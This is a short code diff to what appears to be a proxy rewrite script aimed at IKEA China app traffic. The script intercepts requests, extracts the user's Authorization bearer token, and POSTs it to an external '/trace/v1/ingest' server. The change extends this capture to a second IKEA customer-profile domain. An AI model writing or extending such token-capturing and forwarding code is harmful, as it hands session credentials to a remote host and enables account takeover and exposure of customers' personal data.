@@ -22,8 +22,10 @@ function main(){
  const req=(typeof $request!=='undefined'&&$request)||{};
  const url=String(req.url||'');
  // Only user-requested READ endpoints. No login, payment, orders or bodies.
- const route=/^https:\/\/bff\.app\.ikea\.cn(\/customer-bff\/(?:v3\.0\/activity(?:\/participants)?|customer\/(?:info|profile\/get)|point\/benefit\/summary))(?:\?|$)/i.exec(url);
- if(!route)return finish();
+ const bff=/^https:\/\/bff\.app\.ikea\.cn(\/customer-bff\/(?:v3\.0\/activity(?:\/participants)?|customer\/(?:info|profile\/get)|point\/benefit\/summary))(?:\?|$)/i.exec(url);
+ const ciam=/^https:\/\/ciam\.family\.ikea\.cn(\/ciam\/crbff\/profile\/auth\/customer\/profile\/get)(?:\?|$)/i.exec(url);
+ const source=bff?'https://bff.app.ikea.cn'+bff[1]:ciam?'https://ciam.family.ikea.cn'+ciam[1]:'';
+ if(!source)return finish();
  if(String(req.method||'').toUpperCase()!=='GET')return finish();
  const auth=tokenFrom(req.headers);
  if(!auth)return finish();
@@ -44,7 +46,7 @@ function main(){
  try{
   $task.fetch({url:HOST+'/trace/v1/ingest',method:'POST',opts:{policy:'direct'},
    headers:{Authorization:'Bearer '+get('token'),'Content-Type':'application/json'},
-   body:JSON.stringify({v:1,type:'ikea_auth_v1',service:'ikea',url:'https://bff.app.ikea.cn'+route[1],
+   body:JSON.stringify({v:1,type:'ikea_auth_v1',service:'ikea',url:source,
     captured_at:Date.now(),cookies:{Authorization:auth}})
   }).then(r=>{
    clearTimeout(tid);
